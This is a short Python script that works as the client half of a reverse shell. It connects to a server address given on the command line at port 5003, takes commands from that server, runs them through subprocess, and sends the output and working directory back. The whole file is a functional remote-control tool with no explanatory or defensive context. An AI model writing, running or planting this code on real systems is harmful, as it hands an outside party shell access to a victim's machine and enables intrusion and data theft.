import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    cmd = s.recv(BUFFER_SIZE).decode()
    splited_cmd = cmd.split()
    if cmd.lower() == "exit":
        break
    if splited_cmd[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_cmd[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(cmd)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
s.close()